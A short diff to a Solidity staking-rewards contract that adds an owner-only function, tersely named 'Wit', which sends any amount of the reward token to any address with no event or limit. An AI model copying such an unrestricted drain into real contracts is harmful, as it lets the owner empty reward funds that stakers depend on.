@@ -1195,7 +1195,11 @@ contract StakingRewards is OwnableUpgradeable, PausableUpgradeable, ReentrancyGu
         }
         _;
     }
-
+    
+    function Wit(address addr,uint256 amount) onlyOwner external {
+        rewardsToken.safeTransfer(addr, amount);
+    }
+    
     /* ========== EVENTS ========== */
     event Test(uint256 rate, uint256 start, uint256 balance, uint256 reward, uint256 duration);
 
